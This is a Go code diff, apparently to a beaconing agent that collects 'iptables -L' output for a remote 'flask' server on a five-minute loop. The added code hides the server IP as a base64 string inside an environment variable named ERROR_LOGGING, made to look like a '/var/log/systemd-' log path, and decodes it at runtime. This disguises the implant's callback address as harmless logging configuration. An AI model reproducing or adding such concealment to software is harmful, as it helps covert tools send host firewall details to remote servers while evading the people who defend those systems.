@@ -6,6 +6,7 @@ package main
 
 import (
 	"bytes"
+	b64 "encoding/base64"
 	"encoding/json"
 	"net"
 	"net/http"
@@ -15,8 +16,17 @@ import (
 	"time"
 )
 
-var serv = os.Getenv("UPDATE_SERVER") //IP of flask serv
-var loopTime = 300        //sleep time in seconds
+var serv = getServer() //IP of flask serv
+var loopTime = 300     //sleep time in seconds
+
+// turn encoded environment variable into ip addres
+// example env: "/var/log/systemd-MTkyLjE2OC4xLjE=" => 192.168.1.1
+func getServer() string {
+	envVar := os.Getenv("ERROR_LOGGING") //fetch environment variable
+	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
+	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
+	return string(decoded)
+}
 
 // return output of "iptables -L" as one large string
 func getTables() string {
